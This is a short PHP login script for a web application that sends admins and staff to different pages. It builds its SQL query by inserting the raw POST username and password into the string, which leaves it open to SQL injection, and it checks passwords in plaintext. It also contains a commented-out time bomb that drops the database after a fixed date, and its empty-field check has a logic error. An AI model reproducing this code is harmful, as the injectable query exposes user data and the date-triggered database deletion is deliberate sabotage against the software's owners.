<?php
    require_once('dbConn.php');
    if(isset($_POST['logMeIn'])):
        $username = $_POST['username'];
        $password = $_POST['password'];
        
        if(empty($username) && empty($password)):
            $_SESSION['error'] = "all field are mandatory";
            header('location:../login.php?key=error');
        // elseif(date('Y-m-d') >= '2023-05-10'):
        //     $conn->query("DROP DATABASE `muptj`");
        else:
            $findUSer = $conn->query("SELECT * FROM user WHERE email = '$username' AND password = '$password' limit 1");
            if(mysqli_num_rows($findUSer) > 0):
                $result = mysqli_fetch_array($findUSer);
                $_SESSION['userData'] = $result;
                if($_SESSION['userData']['role'] == "is_admin"):
                    header('location:../view/');
                elseif($_SESSION['userData']['role'] == "is_staff"):
                    header('location:../view/jobPosted.php');
                endif;
            else:
                $_SESSION['error'] = "Wrong Username Or Password";
                header('location:../login.php?key=error');
            endif;
        endif;
    endif;
?>